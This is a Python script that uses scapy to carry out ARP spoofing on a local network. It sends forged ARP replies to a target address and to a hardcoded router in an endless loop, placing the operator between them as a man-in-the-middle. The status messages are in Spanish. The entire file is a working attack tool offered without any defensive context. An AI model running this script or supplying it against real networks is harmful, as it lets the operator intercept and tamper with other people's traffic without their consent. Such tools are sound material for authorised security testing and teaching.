#!/usr/bin/env python3

import scapy.all as scapy
import time
import sys
import argparse
import signal
from termcolor import colored

my_mac = "00:11:22:33:44:55"
ip_router = "192.168.18.1"

def def_handler(sig, frame):
    print(colored("\n[!] Saliendo de ARP Spoof...\n", 'red'))
    print(colored("\t[i] Las tablas ARP de las víctimas pueden tardar un tiempo en actualizarse. \n", 'blue'))
    sys.exit(1)
    
signal.signal(signal.SIGINT, def_handler)   

def get_arguments():
    parser = argparse.ArgumentParser()
    parser.add_argument("-t", "--target", dest="ip_address", required=True, help="Target IP address / IP range to spoof")
    
    options = parser.parse_args()
    
    return options

def spoof(target_ip, spoof_ip):
    
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=my_mac, psrc=spoof_ip) # op=2 is for response, op=1 is for request
    # Router IP as spoof IP to make target think that we are the router 
    scapy.send(packet, verbose=False)
    
def main():
    options = get_arguments()
    print(colored(f"[*] ARP Spoof started. Target: {options.ip_address}", "yellow"))
    while True:
        spoof(options.ip_address, ip_router)
        spoof(ip_router, options.ip_address)

if __name__ == "__main__":
    main()
    